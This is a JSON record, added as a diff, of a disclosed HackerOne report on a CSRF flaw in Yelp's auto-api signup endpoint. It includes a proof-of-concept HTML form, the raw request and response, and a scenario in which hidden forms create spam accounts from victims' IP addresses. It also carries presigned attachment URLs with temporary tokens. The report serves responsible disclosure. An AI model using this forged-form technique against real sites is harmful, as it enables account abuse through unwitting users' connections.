@@ -1,0 +1,203 @@
+{
+  "id": 178831,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNzg4MzE=",
+  "url": "https://hackerone.com/reports/178831",
+  "title": "CSRF on signup endpoint (auto-api.yelp.com)",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2016-10-29T14:59:58.731Z",
+  "submitted_at": "2016-10-29T14:59:58.731Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": true,
+    "username": "denispugachev",
+    "url": "/denispugachev",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 545,
+    "url": "https://hackerone.com/yelp",
+    "handle": "yelp",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/545/de556165eaf2da7600f9ce75d1179281ee2d538f_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/545/de556165eaf2da7600f9ce75d1179281ee2d538f_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Yelp",
+      "twitter_handle": "",
+      "website": "https://www.yelp.com",
+      "about": "Connecting people to great local businesses in communities around the world."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2017-03-01T17:49:09.936Z",
+  "bug_reporter_agreed_on_going_public_at": "2017-03-01T04:29:07.537Z",
+  "team_member_agreed_on_going_public_at": "2017-03-01T17:49:09.870Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Sign up request on https://auto-api.yelp.com/account/create_secure endpoint processes without any checking headers (without cookies, csrf tokens and even user-agent). \n\nThis is sample HTML form:\n---\n\n        <html>\n        <head></head>\n        <body>\n        <form action=\"https://auto-api.yelp.com/account/create_secure?time=1477751842&nonce=lej%2F%2FQ%3D%3D&ywsid=Y3yWooClkisSbx32yJG5Ww&device_type=generic%2Bvbox86p%2FKTU84P&app_version=8.16.0&cc=US&lang=en&efs=cDV544hzFZZpMD6wPVsW0GCyHGRNWhykWC%2BKKikA3b3E%2BohV0t%2FxA0eh5tL1sLQnkasS3MI2wLlfhZ01oKUYMwXvUlRB5mRf8Mit5OryQ7o%3D&signature=_qGv3pOMHN%2BUSpUucP3dKxjwALjI%3D\" method=\"post\">\n        <input type=\"hidden\" name=\"first_name\" value=\"Test1\" />\n        <input type=\"hidden\" name=\"last_name\" value=\"Test2\" />\n        <input type=\"hidden\" name=\"email\" value=\"██████████\" />\n        <input type=\"hidden\" name=\"password\" value=\"123123qq\" />\n        <input type=\"hidden\" name=\"user_country_code\" value=\"AR\" />\n        <input type=\"hidden\" name=\"city\" value=\"12333\" />\n        <input type=\"hidden\" name=\"confirmed\" value=\"0\" />\n        \n        \n        <input type=\"submit\" />\n        </form>\n        </body>\n        </html>\n        \nMaybe when you will check it the signature will be expired, but it is not very difficult to generate the new one.\n\nRequest / Response\n---\n\tPOST /account/create_secure?time=1477751842&nonce=lej%2F%2FQ%3D%3D&ywsid=Y3yWooClkisSbx32yJG5Ww&device_type=generic%2Bvbox86p%2FKTU84P&app_version=8.16.0&cc=US&lang=en&efs=cDV544hzFZZpMD6wPVsW0GCyHGRNWhykWC%2BKKikA3b3E%2BohV0t%2FxA0eh5tL1sLQnkasS3MI2wLlfhZ01oKUYMwXvUlRB5mRf8Mit5OryQ7o%3D&signature=_qGv3pOMHN%2BUSpUucP3dKxjwALjI%3D HTTP/1.1\n\tAccept-Encoding: gzip\n\tContent-Type: application/x-www-form-urlencoded\n\tContent-Encoding: UTF-8\n\tHost: auto-api.yelp.com\n\tConnection: Keep-Alive\n\tContent-Length: 125\n\n\tfirst_name=Test1&last_name=Test2&email=█████&password=123123qq&user_country_code=AR&city=12333&confirmed=0\n\n*****RESPONSE*****\n\n\n\tHTTP/1.1 200 OK\n\tDate: Sat, 29 Oct 2016 14:42:19 GMT\n\tContent-Type: application/json; charset=UTF-8\n\tTransfer-Encoding: chunked\n\tConnection: keep-alive\n\tSet-Cookie: __cfduid=d35a860a4d504b624ad0351d3bcdb467e1477752138; expires=Sun, 29-Oct-17 14:42:18 GMT; path=/; domain=.yelp.com; HttpOnly\n\tX-Node: api_com\n\tCache-Control: max-age=0, must-revalidate, no-cache, no-store, private\n\tExpires: Sat, 29 Oct 2016 14:42:19 GMT\n\tPragma: no-cache\n\tSet-Cookie: bse=9e2087a24cf46f0ac9ffc3a568f27917; Domain=.yelp.com; Path=/; HttpOnly\n\tSet-Cookie: yuv=██████████████; Domain=.yelp.com; Max-Age=630720000; Path=/; expires=Fri, 24-Oct-2036 14:42:19 GMT\n\tX-Content-Type-Options: nosniff\n\tSet-Cookie: api_s=██████████; Max-Age=630720000; Path=/; expires=Fri, 24-Oct-2036 14:42:19 GMT; HttpOnly\n\tSet-Cookie: api_ss=███████; Max-Age=630720000; Path=/; expires=Fri, 24-Oct-2036 14:42:19 GMT; secure; HttpOnly\n\tX-Node: web19-r4-sfo2\n\tVary: Accept-Encoding,User-Agent\n\tContent-Encoding: gzip\n\tX-Mode: rw\n\tX-Proxied: extlb7-r10-sfo2\n\tX-Mode: rw\n\tX-Proxied: extlb4-r9-iad1\n\tServer: cloudflare-nginx\n\tCF-RAY: 2f9764b29e8e3798-ARN\n\n\t{\"first_name\": \"Test1\", \"last_name\": \"Test2\", \"user_id\": \"█████\", \"name\": \"Test1 T.\", \"is_confirmed\": false, \"expiry\": 1485528139, \"location\": \"La Matanza\", \"name_without_period\": \"Test1 T\", \"message\": {\"text\": \"OK\", \"code\": 0, \"version\": \"1.1.1\", \"request_id\": \"428b82b44de28038\"}, \"email\": \"█████\", \"last_initial\": \"T\"}\n\nHow it can be exploitable? \n---\nAttacker can make many hidden forms with pre-generated sign up fields to make accounts from victim's IP address (for example very cheap clickunder traffic on special HTML page with hidden form). Later created accounts can be used for spam purposes.\n\nIt can be done also with login and password forget endpoint: https://auto-api.yelp.com/account/login_secure\nhttps://auto-api.yelp.com/account/send_password_email_secure\n\n\n***Please check saved Charles session file in attachments***",
+  "weakness": {
+    "id": 45,
+    "name": "Cross-Site Request Forgery (CSRF)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 131024,
+      "file_name": "signup_csrf.html",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/131/024/5f043f6e4dab643b526eb02d68c18941d6091647/signup_csrf.html?response-content-disposition=attachment%3B%20filename%3D%22signup_csrf.html%22%3B%20filename%2A%3DUTF-8%27%27signup_csrf.html&response-content-type=application%2Foctet-stream&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ47LCDWAH%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T064133Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBkRWCl1RKRqNekyLlNCVTlSAMjT73WloYffEby9J0w5AiAYbzX4aOz2M1rLYQ6rNJ%2FcRPiK4DOTiLKsI%2FC9m4SpDyqxBQh%2FEAMaDDAxMzYxOTI3NDg0OSIM%2FOQtl%2BDXi57Kgv1xKo4F2XadsPa0RedMfYfVmm%2BVBkClj2eV52VYw49ueYrC%2FPFYFJv1sbbvXzQSp6pqOW0yIkhTtJB66AAD11eHLSb2dk8JzYx14nvI5Ow4EN%2FZdhYBRVASmKFx%2F9cIkIJ6v%2FCwC4k9gHM422ogMBiNcPtY6n0%2F%2BbBdeQr4jJl18IkW3dHa0GuOoJ5RZAiAJ0NApxBwwoRRnDlB5a40c7uraKzHhT8c7%2BQ%2BHOUWVjKuBHZugSYB0C%2B%2B4Px1GtS23dhCXd6w%2F4dgk4XzzckvLnT2oeJVQ9XMsrtnEfihK%2Fc6i2AZBv3z%2FkXZmSFMt1k5iYAtqhzheya7qIksk11n3TzeD%2Bo8Uzq2mVgd%2B%2BhF3ObUduaE6%2BxeDSw92YwGs7R1e4eGGoPJfvb2oJUDzDHQnKeL4FkQsp17dixGukzamp774%2BEElkuGKlPDEbiKQTQl7Q%2FKoR0HR%2B1oMVrm%2BzQYp9YUTnf328DIRcirGLs3%2Fk4S2x1UIYVjZf4BXWHnIZHFCIl88nX5pRj0jnglEf0mDnnI%2FQI310SuesQwEIc1WBsJd92PJ0pDE%2B%2BLT1ppwhNsJbzzMEoPKfjqhiBjZI4N1R5AvaDcSvbfL1DMIyjaZG8lty9xSFDXSVesoymqbNW19wr7fErauZp66E0Imv45UgzBZ3Bx2tCfWs3ZqUBa%2FCEbCRtkkDxOawqDHfPzXoC7ig1xNklgEH4zEsCVcCmg1aJf%2B55i2TvM0vXdwgJbwlkKV7IGmKCOzStClSjNC%2BZyOo8dOCOBqshEljsRIOKvSDKv%2FL5YA80R2n1N%2FoaJGNl6upOroi29PBmVf8vFVEZ31aQ6LQ8SY%2FEmi7IH%2FDE1XZSyogF5Ftyy0zDCHikz%2BeNbjKdWMOTHt9IGOrIBrtiCJxeg5%2Bmst%2FXFpWcvlh%2FPmiwTkGBdm%2FQ6yE5EYo2%2BC%2Fixcqyt9nnZvE18%2BzVcmo16DkL1HHJ6rrUYoS6MqoPojxR1mauNbyyw%2Bv4OdjsRk4I8an%2B5jvy0tb%2BlchgxXanJPRGGP1ViUTJOGB6qBz%2B%2FpQdJzk5A35cJq0EkDCsMCUQEvWC9bV4oCEgOkrjzIp%2ByYWUqKmsRV4fZ0Xb0IdZwn3jZNMIaC0lwtkKwjy7oDg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a2cc59f078bfe98b72f312df18d32822f132b0ec15423e92b779a1e5198be8c1",
+      "file_size": 873,
+      "type": "text/html",
+      "moderated": null
+    },
+    {
+      "id": 131025,
+      "file_name": "session.chls",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/131/025/4ffb6b33ae27fc71f741db2550854eda952425e2/session.chls?response-content-disposition=attachment%3B%20filename%3D%22session.chls%22%3B%20filename%2A%3DUTF-8%27%27session.chls&response-content-type=application%2Foctet-stream&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ47LCDWAH%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T064133Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBkRWCl1RKRqNekyLlNCVTlSAMjT73WloYffEby9J0w5AiAYbzX4aOz2M1rLYQ6rNJ%2FcRPiK4DOTiLKsI%2FC9m4SpDyqxBQh%2FEAMaDDAxMzYxOTI3NDg0OSIM%2FOQtl%2BDXi57Kgv1xKo4F2XadsPa0RedMfYfVmm%2BVBkClj2eV52VYw49ueYrC%2FPFYFJv1sbbvXzQSp6pqOW0yIkhTtJB66AAD11eHLSb2dk8JzYx14nvI5Ow4EN%2FZdhYBRVASmKFx%2F9cIkIJ6v%2FCwC4k9gHM422ogMBiNcPtY6n0%2F%2BbBdeQr4jJl18IkW3dHa0GuOoJ5RZAiAJ0NApxBwwoRRnDlB5a40c7uraKzHhT8c7%2BQ%2BHOUWVjKuBHZugSYB0C%2B%2B4Px1GtS23dhCXd6w%2F4dgk4XzzckvLnT2oeJVQ9XMsrtnEfihK%2Fc6i2AZBv3z%2FkXZmSFMt1k5iYAtqhzheya7qIksk11n3TzeD%2Bo8Uzq2mVgd%2B%2BhF3ObUduaE6%2BxeDSw92YwGs7R1e4eGGoPJfvb2oJUDzDHQnKeL4FkQsp17dixGukzamp774%2BEElkuGKlPDEbiKQTQl7Q%2FKoR0HR%2B1oMVrm%2BzQYp9YUTnf328DIRcirGLs3%2Fk4S2x1UIYVjZf4BXWHnIZHFCIl88nX5pRj0jnglEf0mDnnI%2FQI310SuesQwEIc1WBsJd92PJ0pDE%2B%2BLT1ppwhNsJbzzMEoPKfjqhiBjZI4N1R5AvaDcSvbfL1DMIyjaZG8lty9xSFDXSVesoymqbNW19wr7fErauZp66E0Imv45UgzBZ3Bx2tCfWs3ZqUBa%2FCEbCRtkkDxOawqDHfPzXoC7ig1xNklgEH4zEsCVcCmg1aJf%2B55i2TvM0vXdwgJbwlkKV7IGmKCOzStClSjNC%2BZyOo8dOCOBqshEljsRIOKvSDKv%2FL5YA80R2n1N%2FoaJGNl6upOroi29PBmVf8vFVEZ31aQ6LQ8SY%2FEmi7IH%2FDE1XZSyogF5Ftyy0zDCHikz%2BeNbjKdWMOTHt9IGOrIBrtiCJxeg5%2Bmst%2FXFpWcvlh%2FPmiwTkGBdm%2FQ6yE5EYo2%2BC%2Fixcqyt9nnZvE18%2BzVcmo16DkL1HHJ6rrUYoS6MqoPojxR1mauNbyyw%2Bv4OdjsRk4I8an%2B5jvy0tb%2BlchgxXanJPRGGP1ViUTJOGB6qBz%2B%2FpQdJzk5A35cJq0EkDCsMCUQEvWC9bV4oCEgOkrjzIp%2ByYWUqKmsRV4fZ0Xb0IdZwn3jZNMIaC0lwtkKwjy7oDg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ab9161bf9d1947a07d0018a0e0ef8c9ad4ea0aa72541db7ccb06fdeb0304248c",
+      "file_size": 5077,
+      "type": "application/octet-stream",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2017-03-31T04:29:07.569Z",
+  "allow_singular_disclosure_after": -292558346.23906016,
+  "singular_disclosure_allowed": true,
+  "vote_count": 13,
+  "voters": [
+    "cdl",
+    "jon_bottarini",
+    "pr0f0x01",
+    "gamliel",
+    "madrobot",
+    "mpz",
+    "eveeez",
+    "ak1t4",
+    "c12316651",
+    "japz",
+    "and 3 more..."
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "178831",
+  "votes": 13,
+  "latest_disclosable_activity_at": "2017-03-01T17:49:09.957Z",
+  "severity": null,
+  "_metadata": {
+    "saved_at": "2026-07-08T14:41:33.923689",
+    "source": "https://hackerone.com/reports/178831.json",
+    "report_id": 178831
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNzg4MzE=",
+    "databaseId": "178831",
+    "title": "CSRF on signup endpoint (auto-api.yelp.com)",
+    "url": "https://hackerone.com/reports/178831",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2017-03-01T17:49:09.936Z",
+    "created_at": "2016-10-29T14:59:58.731Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzQ1",
+      "name": "Cross-Site Request Forgery (CSRF)",
+      "external_id": "cwe-352"
+    },
+    "severity": null,
+    "reporter": {
+      "username": "denispugachev"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzU0NQ==",
+      "handle": "yelp",
+      "name": "Yelp",
+      "url": "https://hackerone.com/yelp",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": [
+        {
+          "node": {
+            "id": "Z2lkOi8vaGFja2Vyb25lL0JvdW50eS80MzEwNA==",
+            "amount": "0.00",
+            "awarded_amount": "0.00",
+            "awarded_bonus_amount": "0.00",
+            "created_at": "2017-02-28T19:43:03.777Z"
+          }
+        }
+      ]
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzE3ODgzMQ==",
+    "_id": "178831",
+    "disclosed": true,
+    "votes": 13,
+    "latest_disclosable_activity_at": "2017-03-01T17:49:09.957Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNzg4MzE=",
+      "databaseId": "178831",
+      "title": "CSRF on signup endpoint (auto-api.yelp.com)",
+      "url": "https://hackerone.com/reports/178831",
+      "disclosed_at": "2017-03-01T17:49:09.936Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzU0NQ==",
+      "handle": "yelp",
+      "name": "Yelp",
+      "url": "https://hackerone.com/yelp",
+      "currency": "usd"
+    }
+  }
+}
